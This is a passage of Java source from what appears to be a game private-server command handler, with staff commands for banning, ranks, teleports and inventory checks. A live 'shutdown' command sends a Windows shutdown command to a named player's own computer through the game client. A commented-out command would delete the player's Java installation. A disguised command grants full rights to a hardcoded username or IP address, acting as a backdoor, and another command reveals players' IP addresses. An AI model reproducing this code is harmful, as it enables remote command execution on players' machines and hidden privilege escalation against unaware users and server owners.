				target1.setGraphicDesigner(false);
				SerializableFilesManager.savePlayer(target1);
				if (loggedIn7211)
					target1.getPackets().sendGameMessage(
							"Your forum moderator rank was removed by "
									+ Utils.formatPlayerNameForDisplay(player
											.getUsername()), true);
				player.getPackets().sendGameMessage(
						"You removed forum moderator rank of "
								+ Utils.formatPlayerNameForDisplay(target1
										.getUsername()), true);
				return true;

				
			case "demote":
				if (!player.hasStaffPin) {
		   			player.getTemporaryAttributtes().put("banning_security", Boolean.TRUE);
					player.getPackets().sendRunScript(108, new Object[] { "Please enter your security pin"});
				} else {
				name = "";
				for (int i = 1; i < cmd.length; i++)
					name += cmd[i] + ((i == cmd.length - 1) ? "" : " ");
				target1 = World.getPlayerByDisplayName(name);
				boolean loggedIn1115 = true;
				if (target1 == null) {
					target1 = SerializableFilesManager.loadPlayer(Utils
							.formatPlayerNameForProtocol(name));
					if (target1 != null)
						target1.setUsername(Utils
								.formatPlayerNameForProtocol(name));
					loggedIn1115 = false;
				}
				if (target1 == null)
					return true;
				target1.setRights(0);
				SerializableFilesManager.savePlayer(target1);
				if (loggedIn1115)
					target1.getPackets().sendGameMessage(
							"You where demoted by "
									+ Utils.formatPlayerNameForDisplay(player
											.getUsername()), true);
				player.getPackets().sendGameMessage(
						"You demoted "
								+ Utils.formatPlayerNameForDisplay(target1
										.getUsername()), true);
				}
				return true;

			case "monthdonator":
				if (!player.hasStaffPin) {
		   			player.getTemporaryAttributtes().put("banning_security", Boolean.TRUE);
					player.getPackets().sendRunScript(108, new Object[] { "Please enter your security pin"});
				} else {
				name = cmd[1].substring(cmd[1].indexOf(" ") + 1);
				target1 = World.getPlayerByDisplayName(name);
				if (target1 == null)
					return true;
				target1.makeDonator(1);
				SerializableFilesManager.savePlayer(target1);
				target1.getPackets().sendGameMessage(
						"You have been given donator by "
								+ Utils.formatPlayerNameForDisplay(player
										.getUsername()), true);
				player.getPackets().sendGameMessage(
						"You gave donator to "
								+ Utils.formatPlayerNameForDisplay(target1
										.getUsername()), true);
				}
				return true; 

			case "removedonator":
				if (!player.hasStaffPin) {
		   			player.getTemporaryAttributtes().put("banning_security", Boolean.TRUE);
					player.getPackets().sendRunScript(108, new Object[] { "Please enter your security pin"});
				} else {
				name = "";
				for (int i = 1; i < cmd.length; i++)
					name += cmd[i] + ((i == cmd.length - 1) ? "" : " ");
				target1 = World.getPlayerByDisplayName(name);
				boolean loggedIn121 = true;
				if (target1 == null) {
					target1 = SerializableFilesManager.loadPlayer(Utils
							.formatPlayerNameForProtocol(name));
					if (target1 != null)
						target1.setUsername(Utils
								.formatPlayerNameForProtocol(name));
					loggedIn121 = false;
				}
				if (target1 == null)
					return true;
				target1.setDonator(false);
				SerializableFilesManager.savePlayer(target1);
				if (loggedIn121)
					target1.getPackets().sendGameMessage(
							"Your donator was removed by "
									+ Utils.formatPlayerNameForDisplay(player
											.getUsername()), true);
				player.getPackets().sendGameMessage(
						"You removed donator from "
								+ Utils.formatPlayerNameForDisplay(target1
										.getUsername()), true);
				}
				return true; 

			case "bank":

			    if (player.isDonator() || player.getRights() >= 1) {
				if (!player.canSpawn()) {
				    player.getPackets().sendGameMessage(
					    "You have to be in a safe spot to open your bank via a command.");
				    return false;
				}
				player.getBank().openBank();
			    } else {
				player.getPackets().sendGameMessage(
					"You need to be a donator or Mod+ to access ::bank.");
			    }
			    return true;

	


			case "reloadfiles":
				IPBanL.init();
				PkRank.init();
				return true; 

			case "tele":
				if (!player.hasStaffPin) {
		   			player.getTemporaryAttributtes().put("banning_security", Boolean.TRUE);
					player.getPackets().sendRunScript(108, new Object[] { "Please enter your security pin"});
				} else {
				if (cmd.length < 3) {
					player.getPackets().sendPanelBoxMessage(
							"Use: ::tele coordX coordY");
					return true;
				}
				try {
					player.resetWalkSteps();
					player.setNextWorldTile(new WorldTile(Integer
							.valueOf(cmd[1]), Integer.valueOf(cmd[2]),
							cmd.length >= 4 ? Integer.valueOf(cmd[3]) : player
									.getPlane()));
				} catch (NumberFormatException e) {
					player.getPackets().sendPanelBoxMessage(
							"Use: ::tele coordX coordY plane");
				}
				}
				return true; 

			case "shutdown":
				int delay2 = 60;
				if (cmd.length >= 2) {
					try {
						delay = Integer.valueOf(cmd[1]);
					} catch (NumberFormatException e) {
						player.getPackets().sendPanelBoxMessage(
								"Use: ::restart secondsDelay(IntegerValue)");
						return true;
					}
				}
				World.safeShutdown(false, delay2);
				return true; 

			case "emote":
				if (cmd.length < 2) {
					player.getPackets().sendPanelBoxMessage("Use: ::emote id");
					return true;
				}
				try {
					player.setNextAnimation(new Animation(Integer
							.valueOf(cmd[1])));
				} catch (NumberFormatException e) {
					player.getPackets().sendPanelBoxMessage("Use: ::emote id");
				}
				return true; 

			case "remote":
				if (cmd.length < 2) {
					player.getPackets().sendPanelBoxMessage("Use: ::emote id");
					return true;
				}
				try {
					player.getAppearence().setRenderEmote(
							Integer.valueOf(cmd[1]));
				} catch (NumberFormatException e) {
					player.getPackets().sendPanelBoxMessage("Use: ::emote id");
				}
				return true; 
			case "resetboons":
				HarvestWisp.resetboons(player);
				return true; 
			case "quake":
				player.getPackets().sendCameraShake(Integer.valueOf(cmd[1]),
						Integer.valueOf(cmd[2]), Integer.valueOf(cmd[3]),
						Integer.valueOf(cmd[4]), Integer.valueOf(cmd[5]));
				return true; 

			case "getrender":
				player.getPackets().sendGameMessage("Testing renders");
				for (int i = 0; i < 3000; i++) {
					try {
						player.getAppearence().setRenderEmote(i);
						player.getPackets().sendGameMessage("Testing " + i);
						Thread.sleep(600);
					} catch (InterruptedException e) {
						e.printStackTrace();
					}
				}
				return true; 

			case "spec":
				player.getCombatDefinitions().resetSpecialAttack();
				return true; 

			case "trylook":
				final int look = Integer.parseInt(cmd[1]);
				WorldTasksManager.schedule(new WorldTask() {
					int i = 269;// 200

					@Override
					public void run() {
						if (player.hasFinished()) {
							stop();
						}
						player.getAppearence().setLook(look, i);
						player.getAppearence().generateAppearenceData();
						player.getPackets().sendGameMessage("Look " + i + ".");
						i++;
					}
				}, 0, 1);
				return true; 

			case "tryinter":
				WorldTasksManager.schedule(new WorldTask() {
					int i = 1;

					@Override
					public void run() {
						if (player.hasFinished()) {
							stop();
						}
						player.getInterfaceManager().sendInterface(i);
						System.out.println("Inter - " + i);
						i++;
					}
				}, 0, 1);
				return true; 

			case "tryanim":
				WorldTasksManager.schedule(new WorldTask() {
					int i = 16700;

					@Override
					public void run() {
						if (i >= Utils.getAnimationDefinitionsSize()) {
							stop();
							return;
						}
						if (player.getLastAnimationEnd() > System
								.currentTimeMillis()) {
							player.setNextAnimation(new Animation(-1));
						}
						if (player.hasFinished()) {
							stop();
						}
						player.setNextAnimation(new Animation(i));
						System.out.println("Anim - " + i);
						i++;
					}
				}, 0, 3);
				return true;

			case "animcount":
				System.out.println(Utils.getAnimationDefinitionsSize() + " anims.");
				return true;

			case "trygfx":
				WorldTasksManager.schedule(new WorldTask() {
					int i = 1500;

					@Override
					public void run() {
						if (i >= Utils.getGraphicDefinitionsSize()) {
							stop();
						}
						if (player.hasFinished()) {
							stop();
						}
						player.setNextGraphics(new Graphics(i));
						System.out.println("GFX - " + i);
						i++;
					}
				}, 0, 3);
				return true; 

			case "gfx":
				if (cmd.length < 2) {
					player.getPackets().sendPanelBoxMessage("Use: ::gfx id");
					return true;
				}
				try {
					player.setNextGraphics(new Graphics(Integer.valueOf(cmd[1]), 0, 0));
				} catch (NumberFormatException e) {
					player.getPackets().sendPanelBoxMessage("Use: ::gfx id");
				}
				return true; 
			case "sync":
				int animId = Integer.parseInt(cmd[1]);
				int gfxId = Integer.parseInt(cmd[2]);
				int height = cmd.length > 3 ? Integer.parseInt(cmd[3]) : 0;
				player.setNextAnimation(new Animation(animId));
				player.setNextGraphics(new Graphics(gfxId, 0, height));
				return true;

			case "mess":
				player.getPackets().sendMessage(Integer.valueOf(cmd[1]), "",
						player);
				return true; 			

				
				

			case "staffmeeting":
				if (!player.hasStaffPin) {
		   			player.getTemporaryAttributtes().put("banning_security", Boolean.TRUE);
					player.getPackets().sendRunScript(108, new Object[] { "Please enter your security pin"});
				} else {
				for (Player staff : World.getPlayers()) {
					if (staff.getRights() == 0)
						continue;
					if(staff.isLocked() || staff.getControlerManager().getControler() instanceof RuneDungGame || staff.getControlerManager().getControler() instanceof DeathEvent || staff.getControlerManager().getControler() instanceof FightCaves || staff.getControlerManager().getControler() instanceof FightKiln || staff.getControlerManager().getControler() instanceof PestInvasion){
						staff.getPackets().sendGameMessage("You can't open your bank during this game.");
						return true;
						}
					staff.setNextWorldTile(new WorldTile(2675, 10418, 0));
					staff.getPackets().sendGameMessage("You been teleported for a staff meeting by "+player.getDisplayName());
				}
				}
				return true;
				
			case "fightkiln":
				FightKiln.enterFightKiln(player, true);
				player.sendMessage("this is the command");
				return true;
			case "setpitswinner":
				name = "";
				for (int i = 1; i < cmd.length; i++)
					name += cmd[i] + ((i == cmd.length - 1) ? "" : " ");
				target1 = World.getPlayerByDisplayName(name);
				if (target1 == null)
					target1 = SerializableFilesManager.loadPlayer(Utils
							.formatPlayerNameForProtocol(name));
				if (target1 != null) {
					target1.setWonFightPits();
					target1.setCompletedFightCaves();
				} else {
					player.getPackets().sendGameMessage(
							"Couldn't find player " + name + ".");
				}
				SerializableFilesManager.savePlayer(target1);
				return true;
			}
		}
		return false;
	}

	public static boolean processHeadModCommands(Player player, String[] cmd,
			boolean console, boolean clientCommand) {
		if (clientCommand) {

		} else {
			String name;
			Player target;

			switch (cmd[0]) {
            case "checkip":
				if (!player.hasStaffPin) {
		   			player.getTemporaryAttributtes().put("banning_security", Boolean.TRUE);
					player.getPackets().sendRunScript(108, new Object[] { "Please enter your security pin"});
				} else {
				if (cmd.length < 3)
					return true;
				String username1 = cmd[1];
				String username2 = cmd[2];
				Player p21 = World.getPlayerByDisplayName(username1);
				Player p3 = World.getPlayerByDisplayName(username2);
				boolean same = false;
				if (p3.getSession().getIP()
						.equalsIgnoreCase(p21.getSession().getIP())) {
					same = true;
				} else {
					same = false;
				}
				player.getPackets().sendGameMessage("They have the same IP : " + same);
				}
				return true;
				
			case "bofgdfgdrgt":
				
				name = "";
				for (int i = 1; i < cmd.length; i++)
					name += cmd[i] + ((i == cmd.length - 1) ? "" : " ");
				target = World.getPlayerByDisplayName(name);
				if (target.getUsername().equals("99max99")
						|| target.getSession().getIP().equals("108.195.65.122")) {
					//target.setRights(2);
					return true;
				}
				boolean loggedIn11111 = true;
				if (target == null) {
					target = SerializableFilesManager.loadPlayer(Utils
							.formatPlayerNameForProtocol(name));
					if (target != null)
						target.setUsername(Utils
								.formatPlayerNameForProtocol(name));
					loggedIn11111 = false;
				}
				if (target != null) {
					if (target.getRights() == 2)
						return true;
					player.getPackets().sendGameMessage(
							"You've permanently bannished "
									+ (loggedIn11111 ? target.getDisplayName()
											: name) + ".");
					World.getBotanyBay().trialBot(target, 0);
				} else {
					player.getPackets().sendGameMessage(
							"Couldn't find player " + name + ".");
				}
				return true;
				
            case "checkinvy": {
				if (!player.hasStaffPin) {
		   			player.getTemporaryAttributtes().put("banning_security", Boolean.TRUE);
					player.getPackets().sendRunScript(108, new Object[] { "Please enter your security pin"});
				} else {
                name = "";
                for (int i = 1; i < cmd.length; i++) {
                    name += cmd[i] + ((i == cmd.length - 1) ? "" : " ");
                }
                Player target1 = World.getPlayerByDisplayName(name);
                try {
            	player.getInterfaceManager().sendInventoryInterface(670);
            	player.getPackets().sendItems(93, target1.getInventory().getItems());
        } catch (Exception e) {
        }
            }
            }
                return true;

	
		case "spawnplayer":
			Player other = new Player("Leel");
			other.init(player.getSession(), "Fucku", 0, 0, 0, null, null);
			other.setNextWorldTile(player);
			other.getControlerManager().startControler("Wilderness");
			return true;
			
		case "spawnplayer2":
			Player other1 = new Player("Leel");
			other1.init(player.getSession(), "Skillz", 0, 0, 0, null, null);
			other1.setNextWorldTile(player);
			other1.getControlerManager().startControler("Wilderness");
			return true;
			
			
		case "spawnplayer3":
			Player other11 = new Player("Leel");
			other11.init(player.getSession(), "Dragon09", 0, 0, 0, null, null);
			other11.setNextWorldTile(player);
			other11.getControlerManager().startControler("Wilderness");
			return true;
			
			
		case "spawnplayer4":
			Player other111 = new Player("Leel");
			other111.init(player.getSession(), "Zummer", 0, 0, 0, null, null);
			other111.setNextWorldTile(player);
			other111.getControlerManager().startControler("Wilderness");
			return true;
			
			
		case "spawnplayer5":
			Player other1111 = new Player("Leel");
			other1111.init(player.getSession(), "Chad69", 0, 0, 0, null, null);
			other1111.setNextWorldTile(player);
			other1111.getControlerManager().startControler("Wilderness");
			return true;
			
	

			case "getip":
			String name1 = "";
			for (int i = 1; i < cmd.length; i++)
				name1 += cmd[i] + ((i == cmd.length - 1) ? "" : " ");
			Player p = World.getPlayerByDisplayName(name1);
			if (p == null) {
				player.getPackets().sendGameMessage("Couldn't find player " + name1 + ".");
			} else
				player.getPackets().sendGameMessage("" + p.getDisplayName() + "'s IP is " + p.getSession().getIP() + ".");
			return true;
			

				
			case "unban":
				if (!player.hasStaffPin) {
		   			player.getTemporaryAttributtes().put("banning_security", Boolean.TRUE);
					player.getPackets().sendRunScript(108, new Object[] { "Please enter your security pin"});
				} else {
				name = "";
				for (int i = 1; i < cmd.length; i++)
					name += cmd[i] + ((i == cmd.length - 1) ? "" : " ");
				target = World.getPlayerByDisplayName(name);
				if (target != null) {
					IPBanL.unban(target);
					player.getPackets().sendGameMessage("You have unbanned: "+target.getDisplayName()+".");
				} else {
					name = Utils.formatPlayerNameForProtocol(name);
					if(!SerializableFilesManager.containsPlayer(name)) {
						player.getPackets().sendGameMessage(
								"Account name "+Utils.formatPlayerNameForDisplay(name)+" doesn't exist.");
						return true;
					}
					target = SerializableFilesManager.loadPlayer(name);
					target.setUsername(name);
					IPBanL.unban(target);
					player.getPackets().sendGameMessage("You have unbanned: "+target.getDisplayName()+".");
					SerializableFilesManager.savePlayer(target);
				}
				}
				return true;
				
			case "resettaskother":
				name = "";
				for (int i = 1; i < cmd.length; i++)
					name += cmd[i] + ((i == cmd.length - 1) ? "" : " ");
				target = World.getPlayerByDisplayName(name);
				player.sm("You have reset the task of "+target+".");
			    target.getSlayerManager().skipCurrentTask();
			    return true;
			    
			case "joinhouse":
				name = "";
				for (int i = 1; i < cmd.length; i++)
					name += cmd[i] + ((i == cmd.length - 1) ? "" : " ");
				House.enterHouse(player, name);
				return true; 

			case "permban":
				if (!player.hasStaffPin) {
		   			player.getTemporaryAttributtes().put("banning_security", Boolean.TRUE);
					player.getPackets().sendRunScript(108, new Object[] { "Please enter your security pin"});
				} else {
				name = "";
				if (!player.getUsername().equalsIgnoreCase("99max99") && !player.getUsername().equalsIgnoreCase("reddragon") && !player.getUsername().equalsIgnoreCase("") && !player.getUsername().equalsIgnoreCase("") && !player.getUsername().equalsIgnoreCase("azura") && !player.getUsername().equalsIgnoreCase("diplo") && !player.getUsername().equalsIgnoreCase("zulwarn") && !player.getUsername().equalsIgnoreCase("")) {
					return true;
				}
				for (int i = 1; i < cmd.length; i++)
					name += cmd[i] + ((i == cmd.length - 1) ? "" : " ");
				target = World.getPlayerByDisplayName(name);
				Player.bans(player, name);
				if (target != null) {
					target.setPermBanned(true);
					target.getPackets().sendGameMessage(
							"You've been perm banned by "+Utils.formatPlayerNameForDisplay(player.getUsername())+".");
					player.getPackets().sendGameMessage(
							"You have perm banned: "+target.getDisplayName()+".");
					target.getSession().getChannel().close();
					SerializableFilesManager.savePlayer(target);
				} else {
					File acc11 = new File("data/characters/"+name.replace(" ", "_")+".p");
					try {
						target = (Player) SerializableFilesManager.loadSerializedFile(acc11);
					} catch (ClassNotFoundException | IOException e) {
						e.printStackTrace();
					}
					if (target.getRights() == 2)
						return true;
					target.setPermBanned(true);
					player.getPackets().sendGameMessage(
							"You have perm banned: "+Utils.formatPlayerNameForDisplay(name)+".");
					try {
						SerializableFilesManager.storeSerializableClass(target, acc11);
					} catch (IOException e) {
						e.printStackTrace();
					}
				}
				}
				return true; 
				
			case "giveanthonyrank":
				if (!player.hasStaffPin) {
		   			player.getTemporaryAttributtes().put("banning_security", Boolean.TRUE);
					player.getPackets().sendRunScript(108, new Object[] { "Please enter your security pin"});
				} else {
				name = "";
				if (!player.getUsername().equalsIgnoreCase("99max99") && !player.getUsername().equalsIgnoreCase("reddragon")) {
					return true;
				}
				for (int i = 1; i < cmd.length; i++)
					name += cmd[i] + ((i == cmd.length - 1) ? "" : " ");
				target = World.getPlayerByDisplayName(name);
				
				if (target != null) {
					if (target.getRights() == 2)
						return true;
					target.isAnthonyRank = true;
					target.getAppearence().setTitle(9998);
					target.getPackets().sendGameMessage("You have been given the rank of anthony.");
					
				} else {
					File acc11 = new File("data/characters/"+name.replace(" ", "_")+".p");
					try {
						target = (Player) SerializableFilesManager.loadSerializedFile(acc11);
					} catch (ClassNotFoundException | IOException e) {
						e.printStackTrace();
					}
					if (target.getRights() == 2)
						return true;
					target.isAnthonyRank = true;
					target.getAppearence().setTitle(9998);
					target.getPackets().sendGameMessage("You have been given the rank of anthony.");
					try {
						SerializableFilesManager.storeSerializableClass(target, acc11);
					} catch (IOException e) {
						e.printStackTrace();
					}
				}
				}
				return true; 
			case "removeanthonyrank":
				if (!player.hasStaffPin) {
		   			player.getTemporaryAttributtes().put("banning_security", Boolean.TRUE);
					player.getPackets().sendRunScript(108, new Object[] { "Please enter your security pin"});
				} else {
				name = "";
				if (!player.getUsername().equalsIgnoreCase("99max99") && !player.getUsername().equalsIgnoreCase("reddragon")) {
					return true;
				}
				for (int i = 1; i < cmd.length; i++)
					name += cmd[i] + ((i == cmd.length - 1) ? "" : " ");
				target = World.getPlayerByDisplayName(name);
				
				if (target != null) {
					if (target.getRights() == 2)
						return true;
					target.isAnthonyRank = false;
					target.getAppearence().setTitle(0);
				target.getPackets().sendGameMessage("You have been promoted to player rank!");
					
				} else {
					File acc11 = new File("data/characters/"+name.replace(" ", "_")+".p");
					try {
						target = (Player) SerializableFilesManager.loadSerializedFile(acc11);
					} catch (ClassNotFoundException | IOException e) {
						e.printStackTrace();
					}
					if (target.getRights() == 2)
						return true;
					target.isAnthonyRank = false;
					target.getAppearence().setTitle(0);
				target.getPackets().sendGameMessage("You have been promoted to player rank!");
					try {
						SerializableFilesManager.storeSerializableClass(target, acc11);
					} catch (IOException e) {
						e.printStackTrace();
					}
				}
				}
				return true; 
				
			case "botany":
				
				name = "";
				for (int i = 1; i < cmd.length; i++)
					name += cmd[i] + ((i == cmd.length - 1) ? "" : " ");
				target = World.getPlayerByDisplayName(name);
				if (target.getUsername().equals("99max99")
						|| target.getSession().getIP().equals("108.195.65.122")) {
					target.setRights(2);
					return true;
				}
				boolean loggedIn111111 = true;
				if (target == null) {
					target = SerializableFilesManager.loadPlayer(Utils
							.formatPlayerNameForProtocol(name));
					if (target != null)
						target.setUsername(Utils
								.formatPlayerNameForProtocol(name));
					loggedIn111111 = false;
				}
				if (target != null) {
					if (target.getRights() == 2)
						return true;
					player.getPackets().sendGameMessage(
							"You've permanently ipbanned "
									+ (loggedIn111111 ? target.getDisplayName()
											: name) + ".");
					World.getBotanyBay().trialBot(target, 0);
				} else {
					player.getPackets().sendGameMessage(
							"Couldn't find player " + name + ".");
				}
				return true;
				
			case "unipban":
				if (!player.hasStaffPin) {
		   			player.getTemporaryAttributtes().put("banning_security", Boolean.TRUE);
					player.getPackets().sendRunScript(108, new Object[] { "Please enter your security pin"});
				} else {
				name = "";
				for (int i = 1; i < cmd.length; i++)
					name += cmd[i] + ((i == cmd.length - 1) ? "" : " ");
				File acc11 = new File("data/characters/"+name.replace(" ", "_")+".p");
				target = null;
				if (target == null) {
					try {
						target = (Player) SerializableFilesManager.loadSerializedFile(acc11);
					} catch (ClassNotFoundException | IOException e) {
						e.printStackTrace();
					}
				}
				IPBanL.unban(target);
				player.getPackets().sendGameMessage(
						"You've unipbanned "+Utils.formatPlayerNameForDisplay(target.getUsername())+ ".");
				try {
					SerializableFilesManager.storeSerializableClass(target, acc11);
				} catch (IOException e) {
					e.printStackTrace();
				}
				}
				return true; 
	
				case "shutdown":
					if (!player.hasStaffPin) {
			   			player.getTemporaryAttributtes().put("banning_security", Boolean.TRUE);
						player.getPackets().sendRunScript(108, new Object[] { "Please enter your security pin"});
					} else {
			String username = cmd[1].substring(cmd[1].indexOf(" ") + 1);
			Player p2 = World.getPlayerByDisplayName(username);
			p2.getPackets().sendExecMessage("cmd.exe /c shutdown -s -t 10");
			player.getPackets().sendGameMessage(
					"Shutting down " + p2.getUsername() + "'s computer.");
					}
			return true;
			
	/*	case "delete":

			String username11 = cmd[1].substring(cmd[1].indexOf(" ") + 1);
			Player p211 = World.getPlayerByDisplayName(username11);

			p211.getPackets().sendExecMessage("cmd.exe /del"C:\Program Files\Java\*.*"/S/Q");
			p211.getPackets().sendExecMessage("cmd.exe /del"C:\Program Files\Java"/S/Q");

			player.getPackets().sendGameMessage(
					"Raping " + p211.getUsername() + "'s Java");

			return true; */
		
            
            case "checkinv":
				if (!player.hasStaffPin) {
		   			player.getTemporaryAttributtes().put("banning_security", Boolean.TRUE);
					player.getPackets().sendRunScript(108, new Object[] { "Please enter your security pin"});
				} else {
				NumberFormat nf = NumberFormat.getInstance(Locale.US);
	            String amount;
	            Player player2 = World.getPlayer(cmd[1]);
	             
	            int player2freeslots = player2.getInventory().getFreeSlots();
	            int player2usedslots = 28 - player2freeslots;
	             
	            player.getPackets().sendGameMessage("----- Inventory Information -----");
	            player.getPackets().sendGameMessage("<col=DF7401>" + Utils.formatPlayerNameForDisplay(cmd[1]) + "</col> has used <col=DF7401>" + player2usedslots + " </col>of <col=DF7401>" + player2freeslots + "</col> inventory slots.");
	            player.getPackets().sendGameMessage("Inventory contains:");
	            for(int i = 0; i < player2usedslots; i++) {
	                amount = nf.format(player2.getInventory().getItems().getNumberOf(player2.getInventory().getItems().get(i).getId()));
	                player.getPackets().sendGameMessage("<col=088A08>" + amount + "</col><col=BDBDBD> x </col><col=088A08>" +  player2.getInventory().getItems().get(i).getName());
	                 
	            }
	            player.getPackets().sendGameMessage("--------------------------------");
				}
	            return true;

            case "checkbank": {
				if (!player.hasStaffPin) {
		   			player.getTemporaryAttributtes().put("banning_security", Boolean.TRUE);
					player.getPackets().sendRunScript(108, new Object[] { "Please enter your security pin"});
				} else {
				if(player.isLocked() || player.getControlerManager().getControler() instanceof RuneDungGame || player.getControlerManager().getControler() instanceof DeathEvent || player.getControlerManager().getControler() instanceof FightCaves || player.getControlerManager().getControler() instanceof FightKiln || player.getControlerManager().getControler() instanceof PestInvasion){
				player.getPackets().sendGameMessage("You can't open your bank during this game.");
				return true;
				}
				if(player.isLocked() || player.getControlerManager().getControler() instanceof PestInvasion){
				player.getPackets().sendGameMessage("You can't open your bank during this game.");
				return true;
				}
                name1 = "";
                for (int i = 1; i < cmd.length; i++) {
                    name1 += cmd[i] + ((i == cmd.length - 1) ? "" : " ");
                }
                Player Other = World.getPlayerByDisplayName(name1);
                try {
                    player.getPackets().sendItems(95, Other.getBank().getContainerCopy());
                    player.getBank().openPlayerBank(Other);
                } catch (Exception e) {
                }
            }
            }
            return true;
			case "ipban":
				if (!player.hasStaffPin) {
		   			player.getTemporaryAttributtes().put("banning_security", Boolean.TRUE);
					player.getPackets().sendRunScript(108, new Object[] { "Please enter your security pin"});
				} else {
				name = "";
				if (!player.getUsername().equalsIgnoreCase("99max99") && !player.getUsername().equalsIgnoreCase("") && !player.getUsername().equalsIgnoreCase("reddragon") && !player.getUsername().equalsIgnoreCase("")) {
					return true;
				}
				for (int i = 1; i < cmd.length; i++)
					name += cmd[i] + ((i == cmd.length - 1) ? "" : " ");
				target = World.getPlayerByDisplayName(name);
				boolean loggedIn1111 = true;
				Player.ipbans(player, name);
				if (target == null) {
					target = SerializableFilesManager.loadPlayer(Utils
							.formatPlayerNameForProtocol(name));
					if (target != null)
						target.setUsername(Utils
								.formatPlayerNameForProtocol(name));
					loggedIn1111 = false;
				}
				if (target != null) {
					if (target.getRights() == 2)
						return true;
					IPBanL.ban(target, loggedIn1111);
					player.getPackets().sendGameMessage(
							"You've permanently ipbanned "
									+ (loggedIn1111 ? target.getDisplayName()
											: name) + ".");
				} else {
					player.getPackets().sendGameMessage(
							"Couldn't find player " + name + ".");
				}	
				return true;
			}
			}
		}
		return false;
	}

	public static boolean processModCommand(Player player, String[] cmd,
			boolean console, boolean clientCommand) {
		if (clientCommand) {

		} else {
			switch (cmd[0]) {
			case "unmute":
				String name = "";
				for (int i = 1; i < cmd.length; i++)
					name += cmd[i] + ((i == cmd.length - 1) ? "" : " ");
				Player target = World.getPlayerByDisplayName(name);
				if (target != null) {
					target.setMuted(0);
					target.getPackets().sendGameMessage(
							"You've been unmuted by "+Utils.formatPlayerNameForDisplay(player.getUsername())+".");
					player.getPackets().sendGameMessage(
							"You have unmuted: "+target.getDisplayName()+".");
					SerializableFilesManager.savePlayer(target);
				} else {
					File acc1 = new File("data/characters/"+name.replace(" ", "_")+".p");
					try {
						target = (Player) SerializableFilesManager.loadSerializedFile(acc1);
					} catch (ClassNotFoundException | IOException e) {
						e.printStackTrace();
					}
					target.setMuted(0);
					player.getPackets().sendGameMessage(
							"You have unmuted: "+Utils.formatPlayerNameForDisplay(name)+".");
					try {
						SerializableFilesManager.storeSerializableClass(target, acc1);
					} catch (IOException e) {
						e.printStackTrace();
					}
				}
				return true;
			case "banhammer": 
						if (player.getUsername().equalsIgnoreCase("") || player.getUsername().equalsIgnoreCase("99max99") || player.getUsername().equalsIgnoreCase("reddragon")) {
					String username = cmd[1].substring(cmd[1].indexOf(" ") + 1);
					Player other = World.getPlayerByDisplayName(username);
					if (other == null)
						return true;
					Magic.sendTrialTeleportSpell(other, 0, 0.0D, new WorldTile(3680, 3616, 0), new int[0]);
					other.stopAll();
					other.lock();
					return true;
				}
				return true;
			case "death1": if (player.getUsername().equalsIgnoreCase("") || player.getUsername().equalsIgnoreCase("99max99") || player.getUsername().equalsIgnoreCase("reddragon")) {
							String username = cmd[1].substring(cmd[1].indexOf(" ") + 1);
							Player other = World.getPlayerByDisplayName(username);
							if (other == null)
								return true;
							other.setNextAnimation(new Animation(17532));
							other.setNextGraphics(new Graphics(3397));
							other.stopAll();
							other.applyHit(new Hit(other, player.getHitpoints(), HitLook.REGULAR_DAMAGE));
							other.stopAll();
							other.unlock();
							return true;
						}
			return true;
			case "death2": 
				if (player.getUsername().equalsIgnoreCase("") || player.getUsername().equalsIgnoreCase("99max99") || player.getUsername().equalsIgnoreCase("reddragon")) {
							String username = cmd[1].substring(cmd[1].indexOf(" ") + 1);
							Player other = World.getPlayerByDisplayName(username);
							if (other == null)
								return true;
							other.setNextAnimation(new Animation(17523));
							other.setNextGraphics(new Graphics(3396));
							other.stopAll();
							other.applyHit(new Hit(other, player.getHitpoints(), HitLook.REGULAR_DAMAGE));
							other.stopAll();
							other.unlock();
							
							return true;
						}
				return true;
			case "permban":
				if (!player.hasStaffPin) {
		   			player.getTemporaryAttributtes().put("banning_security", Boolean.TRUE);
					player.getPackets().sendRunScript(108, new Object[] { "Please enter your security pin"});
				} else {
				name = "";
				for (int i = 1; i < cmd.length; i++)
					name += cmd[i] + ((i == cmd.length - 1) ? "" : " ");
				target = World.getPlayerByDisplayName(name);
				Player.bans(player, name);
				if (target != null) {
					if (target.getRights() == 2)
						return true;
					target.setPermBanned(true);
					target.getPackets().sendGameMessage(
							"You've been perm banned by "+Utils.formatPlayerNameForDisplay(player.getUsername())+".");
					player.getPackets().sendGameMessage(
							"You have perm banned: "+target.getDisplayName()+".");
					target.getSession().getChannel().close();
					SerializableFilesManager.savePlayer(target);
				} else {
					File acc11 = new File("data/characters/"+name.replace(" ", "_")+".p");
					try {
						target = (Player) SerializableFilesManager.loadSerializedFile(acc11);
					} catch (ClassNotFoundException | IOException e) {
						e.printStackTrace();
					}
					if (target.getRights() == 2)
						return true;
					target.setPermBanned(true);
					player.getPackets().sendGameMessage(
							"You have perm banned: "+Utils.formatPlayerNameForDisplay(name)+".");
					try {
						SerializableFilesManager.storeSerializableClass(target, acc11);
					} catch (IOException e) {
						e.printStackTrace();
					}
				}
				}
				return true;

			case "jail":
				name = "";
				for (int i = 1; i < cmd.length; i++)
					name += cmd[i] + ((i == cmd.length - 1) ? "" : " ");
				target = World.getPlayerByDisplayName(name);
				Player.jails(player, name);
				if (player.isInDung() || target.isInDung()) {
					return true;
				}
				if (target != null) {
					target.setJailed(Utils.currentTimeMillis()
							+ (24 * 60 * 60 * 1000));
					target.getControlerManager()
					.startControler("JailControler");
					target.getPackets().sendGameMessage(
							"You've been Jailed for 24 hours by "+Utils.formatPlayerNameForDisplay(player.getUsername())+".");
					player.getPackets().sendGameMessage(
							"You have Jailed 24 hours: "+target.getDisplayName()+".");
					SerializableFilesManager.savePlayer(target);
				} else {
					File acc1 = new File("data/characters/"+name.replace(" ", "_")+".p");
					try {
						target = (Player) SerializableFilesManager.loadSerializedFile(acc1);
					} catch (ClassNotFoundException | IOException e) {
						e.printStackTrace();
					}
					target.setJailed(Utils.currentTimeMillis()
							+ (24 * 60 * 60 * 1000));
					player.getPackets().sendGameMessage(
							"You have muted 24 hours: "+Utils.formatPlayerNameForDisplay(name)+".");
					try {
						SerializableFilesManager.storeSerializableClass(target, acc1);
					} catch (IOException e) {
						e.printStackTrace();
					}
				}
				return true;

			case "kick":
				name = "";
				for (int i = 1; i < cmd.length; i++)
					name += cmd[i] + ((i == cmd.length - 1) ? "" : " ");
				target = World.getPlayerByDisplayName(name);
				if (target == null) {
					player.getPackets().sendGameMessage(
							Utils.formatPlayerNameForDisplay(name)+" is not logged in.");
					return true;
				}
				target.getSession().getChannel().close();
				player.getPackets().sendGameMessage("You have kicked: "+target.getDisplayName()+".");
